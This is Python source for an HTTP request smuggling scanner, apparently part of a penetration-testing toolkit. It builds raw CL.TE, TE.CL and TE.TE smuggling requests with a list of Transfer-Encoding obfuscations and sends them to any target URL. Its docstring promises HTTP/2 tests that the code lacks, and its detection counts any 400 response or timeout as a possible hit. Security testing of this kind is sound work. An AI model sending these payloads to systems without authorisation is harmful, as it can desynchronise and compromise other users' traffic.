"""
HTTP Request Smuggling Testing Wrapper

Tests for HTTP request smuggling vulnerabilities including:
- CL.TE (Content-Length takes precedence on front-end, Transfer-Encoding on back-end)
- TE.CL (Transfer-Encoding takes precedence on front-end, Content-Length on back-end)
- TE.TE (Both use Transfer-Encoding but with obfuscation)
- H2.CL/H2.TE (HTTP/2 downgrade attacks)
"""
import sys
import argparse
import json
import socket
import ssl
import time
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import BaseToolWrapper


@dataclass
class SmugglingFinding:
    """Represents an HTTP smuggling finding"""
    technique: str
    variant: str
    host: str
    port: int
    potential_vuln: bool
    evidence: Optional[str] = None
    response: Optional[str] = None
    timing_diff: Optional[float] = None


class HTTPSmuggler(BaseToolWrapper):
    """HTTP Request Smuggling testing wrapper."""

    # Transfer-Encoding obfuscation variants for TE.TE attacks
    TE_OBFUSCATIONS = [
        "Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: xchunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding: chunked\r\n",
        "Transfer-Encoding\r\n: chunked",
        "X: X\r\nTransfer-Encoding: chunked",
        "Transfer-Encoding: chunKed",
        "Transfer-encoding: chunked",
        "TrAnSfEr-EnCoDiNg: chunked",
        "Transfer-Encoding: chunked\r\nContent-Encoding: gzip",
        "Transfer-Encoding:\n chunked",
    ]

    @property
    def tool_name(self) -> str:
        return "http_smuggler"

    @property
    def tool_category(self) -> str:
        return "advanced"

    def _build_target_args(self, target: str, **kwargs) -> list:
        """HTTP smuggler doesn't use CLI - this returns empty"""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python"""
        return True

    def test_clte(self, host: str, port: int = 443, use_ssl: bool = True,
                  timeout: int = 10, path: str = "/") -> SmugglingFinding:
        """Test CL.TE smuggling (Content-Length front-end, Transfer-Encoding back-end)."""
        # The idea: front-end uses Content-Length, back-end uses Transfer-Encoding
        # We send a request where CL says body is X bytes, but TE says it's less
        # The leftover bytes get prepended to the next request

        # Timing-based detection: if vulnerable, back-end will wait for more data
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"  # This 'G' should get smuggled
        )

        result = self._send_raw(host, port, payload, use_ssl, timeout)

        # Check for timing anomaly or error response
        vuln_detected = self._detect_smuggling(result, 'clte')

        return SmugglingFinding(
            technique='CL.TE',
            variant='basic',
            host=host,
            port=port,
            potential_vuln=vuln_detected,
            evidence=result.get('error') if vuln_detected else None,
            response=result.get('response', '')[:500],
            timing_diff=result.get('timing')
        )

    def test_tecl(self, host: str, port: int = 443, use_ssl: bool = True,
                  timeout: int = 10, path: str = "/") -> SmugglingFinding:
        """Test TE.CL smuggling (Transfer-Encoding front-end, Content-Length back-end)."""
        # The idea: front-end uses Transfer-Encoding, back-end uses Content-Length
        # We send chunked encoding where the chunk contains a new request

        smuggled_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1"
        )

        # Calculate the hex length of the smuggled request
        smuggled_len = hex(len(smuggled_request))[2:]

        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{smuggled_len}\r\n"
            f"{smuggled_request}\r\n"
            f"0\r\n"
            f"\r\n"
        )

        result = self._send_raw(host, port, payload, use_ssl, timeout)
        vuln_detected = self._detect_smuggling(result, 'tecl')

        return SmugglingFinding(
            technique='TE.CL',
            variant='basic',
            host=host,
            port=port,
            potential_vuln=vuln_detected,
            evidence=result.get('error') if vuln_detected else None,
            response=result.get('response', '')[:500],
            timing_diff=result.get('timing')
        )

    def test_tete(self, host: str, port: int = 443, use_ssl: bool = True,
                  timeout: int = 10, path: str = "/") -> List[SmugglingFinding]:
        """Test TE.TE smuggling with various obfuscation techniques."""
        findings = []

        for i, obfuscation in enumerate(self.TE_OBFUSCATIONS[:10]):  # Test first 10
            smuggled = (
                f"GPOST {path} HTTP/1.1\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1"
            )

            smuggled_len = hex(len(smuggled))[2:]

            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{obfuscation}\r\n"
                f"\r\n"
                f"{smuggled_len}\r\n"
                f"{smuggled}\r\n"
                f"0\r\n"
                f"\r\n"
            )

            result = self._send_raw(host, port, payload, use_ssl, timeout)
            vuln_detected = self._detect_smuggling(result, 'tete')

            findings.append(SmugglingFinding(
                technique='TE.TE',
                variant=f'obfuscation_{i}',
                host=host,
                port=port,
                potential_vuln=vuln_detected,
                evidence=obfuscation if vuln_detected else None,
                response=result.get('response', '')[:500],
                timing_diff=result.get('timing')
            ))

        return findings

    def test_clte_differential(self, host: str, port: int = 443, use_ssl: bool = True,
                                timeout: int = 10, path: str = "/") -> SmugglingFinding:
        """
        Differential timing test for CL.TE.
        Send two requests - one normal, one with smuggling attempt.
        Compare timing differences.
        """
        # Normal request timing
        normal_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"\r\n"
            f"x=1"
        )

        normal_result = self._send_raw(host, port, normal_payload, use_ssl, timeout)
        normal_time = normal_result.get('timing', 0)

        # Smuggling attempt - should cause delay if vulnerable
        smuggle_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 10\r\n"  # Says 10 bytes
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"  # But chunked says 0 - leftover bytes expected
        )

        smuggle_result = self._send_raw(host, port, smuggle_payload, use_ssl, timeout)
        smuggle_time = smuggle_result.get('timing', 0)

        # If smuggle request takes significantly longer, might be vulnerable
        timing_diff = smuggle_time - normal_time
        vuln_detected = timing_diff > 5 or 'timeout' in str(smuggle_result.get('error', '')).lower()

        return SmugglingFinding(
            technique='CL.TE',
            variant='differential_timing',
            host=host,
            port=port,
            potential_vuln=vuln_detected,
            evidence=f'Timing diff: {timing_diff:.2f}s' if vuln_detected else None,
            response=smuggle_result.get('response', '')[:500],
            timing_diff=timing_diff
        )

    def test_tecl_differential(self, host: str, port: int = 443, use_ssl: bool = True,
                                timeout: int = 10, path: str = "/") -> SmugglingFinding:
        """
        Differential timing test for TE.CL.
        """
        # Normal request
        normal_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"\r\n"
            f"x=1"
        )

        normal_result = self._send_raw(host, port, normal_payload, use_ssl, timeout)
        normal_time = normal_result.get('timing', 0)

        # TE.CL smuggling attempt
        smuggle_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        )

        smuggle_result = self._send_raw(host, port, smuggle_payload, use_ssl, timeout)
        smuggle_time = smuggle_result.get('timing', 0)

        timing_diff = smuggle_time - normal_time
        vuln_detected = timing_diff > 5 or 'timeout' in str(smuggle_result.get('error', '')).lower()

        return SmugglingFinding(
            technique='TE.CL',
            variant='differential_timing',
            host=host,
            port=port,
            potential_vuln=vuln_detected,
            evidence=f'Timing diff: {timing_diff:.2f}s' if vuln_detected else None,
            response=smuggle_result.get('response', '')[:500],
            timing_diff=timing_diff
        )

    def _send_raw(self, host: str, port: int, payload: str,
                  use_ssl: bool, timeout: int) -> Dict[str, Any]:
        """Send raw HTTP request."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            start_time = time.time()
            sock.connect((host, port))
            sock.send(payload.encode())

            response = b""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break

            end_time = time.time()
            sock.close()

            return {
                'success': True,
                'response': response.decode('utf-8', errors='ignore'),
                'response_length': len(response),
                'timing': end_time - start_time
            }
        except socket.timeout:
            return {
                'success': False,
                'error': 'Socket timeout',
                'timing': timeout
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'timing': 0
            }

    def _detect_smuggling(self, result: Dict[str, Any], technique: str) -> bool:
        """Detect smuggling indicators."""
        if not result.get('success'):
            error = result.get('error', '').lower()
            # Timeout might indicate successful smuggling (server waiting for more data)
            if 'timeout' in error:
                return True
            return False

        response = result.get('response', '').lower()

        # Check for error responses that indicate smuggling
        error_indicators = [
            '400 bad request',
            '405 method not allowed',
            '501 not implemented',
            'unrecognized method',
            'invalid method',
            'malformed request',
            'bad chunk',
        ]

        if any(ind in response for ind in error_indicators):
            return True

        # Check for unexpected responses (might indicate request was processed differently)
        if '200 ok' in response and 'gpost' in result.get('response', '').lower():
            return True

        # Long response time might indicate server confusion
        if result.get('timing', 0) > 5:
            return True

        return False

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run HTTP smuggling tests."""
        from datetime import datetime

        self.start_time = datetime.now()

        # Parse target URL
        parsed = urlparse(target)
        host = parsed.hostname or target
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https' or port == 443
        path = parsed.path or "/"

        timeout = kwargs.get('timeout', 10)
        test_type = kwargs.get('test_type', 'all')

        all_findings = []

        print(f"[*] Testing HTTP Request Smuggling on {host}:{port}")

        if test_type in ['all', 'clte']:
            print("[*] Testing CL.TE smuggling...")
            finding = self.test_clte(host, port, use_ssl, timeout, path)
            all_findings.append(finding)

            print("[*] Testing CL.TE differential timing...")
            finding = self.test_clte_differential(host, port, use_ssl, timeout, path)
            all_findings.append(finding)

        if test_type in ['all', 'tecl']:
            print("[*] Testing TE.CL smuggling...")
            finding = self.test_tecl(host, port, use_ssl, timeout, path)
            all_findings.append(finding)

            print("[*] Testing TE.CL differential timing...")
            finding = self.test_tecl_differential(host, port, use_ssl, timeout, path)
            all_findings.append(finding)

        if test_type in ['all', 'tete']:
            print("[*] Testing TE.TE smuggling with obfuscations...")
            findings = self.test_tete(host, port, use_ssl, timeout, path)
            all_findings.extend(findings)

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Filter vulnerable findings
        vulnerable = [f for f in all_findings if f.potential_vuln]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"smuggling_test_{timestamp}.json"

        results_data = {
            'target': target,
            'host': host,
            'port': port,
            'use_ssl': use_ssl,
            'total_tests': len(all_findings),
            'vulnerable_count': len(vulnerable),
            'findings': [
                {
                    'technique': f.technique,
                    'variant': f.variant,
                    'potential_vuln': f.potential_vuln,
                    'evidence': f.evidence,
                    'response_preview': f.response[:200] if f.response else None,
                    'timing_diff': f.timing_diff
                }
                for f in all_findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        print(f"[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': all_findings,
            'vulnerable_count': len(vulnerable)
        }


def main():
    parser = argparse.ArgumentParser(
        description="HTTP Smuggler - Test for HTTP Request Smuggling vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python http_smuggler.py -u "https://example.com/"
  python http_smuggler.py -u "https://example.com/api" --test-type clte
  python http_smuggler.py -u "https://example.com/" --test-type tete
  python http_smuggler.py -u "http://example.com:8080/" --timeout 15
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--test-type", default="all",
                       choices=['all', 'clte', 'tecl', 'tete'],
                       help="Type of smuggling test (default: all)")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                       help="Socket timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    tester = HTTPSmuggler()

    result = tester.run(
        target=args.url,
        test_type=args.test_type,
        timeout=args.timeout,
        output_file=args.output
    )

    # Print summary
    print(f"\n{'='*60}")
    print(f"HTTP Request Smuggling Test Results")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Total Tests: {len(result['results'])}")
    print(f"Potential Vulnerabilities: {result['vulnerable_count']}")

    if result['vulnerable_count'] > 0:
        print(f"\n[!] POTENTIAL HTTP SMUGGLING FOUND!")
        for finding in result['results']:
            if finding.potential_vuln:
                print(f"\n  Technique: {finding.technique}")
                print(f"  Variant: {finding.variant}")
                if finding.timing_diff:
                    print(f"  Timing Diff: {finding.timing_diff:.2f}s")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence}")
    else:
        print("\n[+] No HTTP smuggling vulnerabilities detected")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    sys.exit(main())
